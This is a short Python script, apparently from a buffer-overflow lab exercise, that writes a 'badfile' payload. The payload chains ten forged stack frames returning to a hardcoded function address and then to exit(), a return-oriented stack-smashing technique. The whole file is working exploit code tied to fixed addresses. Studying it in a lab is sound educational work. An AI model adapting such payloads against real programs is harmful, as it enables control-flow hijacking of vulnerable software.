#!/usr/bin/python3
import sys

def tobytes(value):
    return (value).to_bytes(4, byteorder='little')

baz_skip_addr = 0x56556315 + 7
exit_addr = 0xf7dfcec0
ebp_foo = 0xffffc9d8

content = bytearray(0xaa for i in range(112))

ebp_next = ebp_foo
for i in range(10):
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(baz_skip_addr)
    content += tobytes(0xAABBCCDD)
    content += b'A' * (0x20 - 3*4)

content += tobytes(0xFFFFFFFF)
content += tobytes(exit_addr)
content += tobytes(0xAABBCCDD)

with open("badfile", "wb") as f:
    f.write(content)
